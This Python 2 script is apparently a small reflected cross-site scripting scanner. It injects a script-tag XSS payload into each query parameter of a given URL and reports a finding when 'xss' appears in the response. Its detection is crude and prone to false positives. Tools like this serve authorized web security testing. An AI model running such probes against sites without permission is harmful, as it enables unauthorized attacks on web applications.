import sys,re,urllib,urllib2,string,urlparse

print "\n\nCopyright @ Shadab Siddiqui"
print " \nEnter your Site URL in XSS.py file where there is a parameter named site,this script will test all the paramters in the given URL"
print "\nExample url ::   http://www.example.com/computers/peripherals/hp?query=hp&field=brand&cid=20227&layout=grid"

#<---------------Enter The URL between double quote------------------------>

site="False"

#<------------------------------------------------------------------------->

if (site == "False"):
	print " \nPlease enter the URL in site variable and Re-run the script \n"
	sys.exit(0)

#<--------------Parsing the URL-------------------------->
print "Working Please be patient \n"
parse_url = urlparse.urlparse(site)
base_url = '%s://%s%s' % (parse_url.scheme,parse_url.netloc,parse_url.path)
b_tmp = urlparse.urlparse(site)[4].split('&')

#<----------splitting the parameters in the URL---------->
b = []
for x in b_tmp:
	x_1 = x.split('=')
	b.append(x_1)

#<------------Enter your payloads here within double quotes, separated by commas----------->
payloads = ["\"><script>alert('xss')</script>"]


#<----------Dependign upon the payload what shall be searched in the page to confirm XSS is there in my case its "XSS" only------->
reply=["xss","XSS","Xss"]

#<----------Searching the parameters are vulnerable or not after using the payloads----->>
for [p_key_1,p_val_1] in b:
	param_string = ''
	for [p_key_2,p_val_2] in b:
		for payload in payloads:
			if p_key_1 == p_key_2:
				param_string += '%s=%s&' % (p_key_1,payload)
			else:
				param_string += '%s=%s&' % (p_key_2,p_val_2)
	param_string = param_string[:-1]
	

	try:
		attack_url = '%s?%s' % (base_url,param_string)
		
		attack= urllib2.urlopen(attack_url)

		for line in attack.readlines():
			
			if re.search("XSS",line.upper()):
				print "\nVulnerablity Found at: ",attack_url
				print "\n"
				break
			
	except Exception,e:
		print "\n\n\nerror:: ",e

	#print '-----'
